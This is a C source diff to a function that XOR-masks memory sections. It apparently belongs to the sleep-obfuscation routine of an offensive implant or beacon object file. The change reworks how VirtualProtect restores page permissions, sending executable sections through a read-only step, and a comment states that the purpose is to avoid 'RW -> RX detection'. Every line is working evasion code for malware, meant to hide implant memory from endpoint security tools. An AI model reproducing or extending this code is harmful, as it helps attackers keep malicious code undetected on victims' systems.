@@ -48,16 +48,35 @@ void xor_section ( MEMORY_SECTION * section, BOOL mask )
 
     if ( mask == FALSE && section->CurrentProtect != section->PreviousProtect )
     {
-        DWORD old_protect_1 = 0;
-        DWORD old_protect_2   = 0;
+        DWORD old_protect = 0;
 
-        // Protect as READONLY and then restore original protection. This avoids: RX -> RW -> RX -> ... flipping.
+        // Check if target protection is executable to avoid RX -> RW -> RX flipping
+        BOOL is_executable = ( section->PreviousProtect == PAGE_EXECUTE ||
+                               section->PreviousProtect == PAGE_EXECUTE_READ ||
+                               section->PreviousProtect == PAGE_EXECUTE_READWRITE ||
+                               section->PreviousProtect == PAGE_EXECUTE_WRITECOPY );
 
-        KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, PAGE_READONLY, &old_protect_1 );
-        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, section->PreviousProtect, &old_protect_2 ) )
+        if ( is_executable )
         {
-            section->CurrentProtect  = section->PreviousProtect;
-            section->PreviousProtect = old_protect_1;
+            // For executable sections: RW -> READONLY -> RX (avoids RW -> RX detection)
+            DWORD temp_protect = 0;
+            if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, PAGE_READONLY, &temp_protect ) )
+            {
+                if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, section->PreviousProtect, &old_protect ) )
+                {
+                    section->CurrentProtect  = section->PreviousProtect;
+                    section->PreviousProtect = temp_protect;
+                }
+            }
+        }
+        else
+        {
+            // For data sections: directly restore RW -> RW (no flipping issue)
+            if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, section->PreviousProtect, &old_protect ) )
+            {
+                section->CurrentProtect  = section->PreviousProtect;
+                section->PreviousProtect = old_protect;
+            }
         }
     }
 }
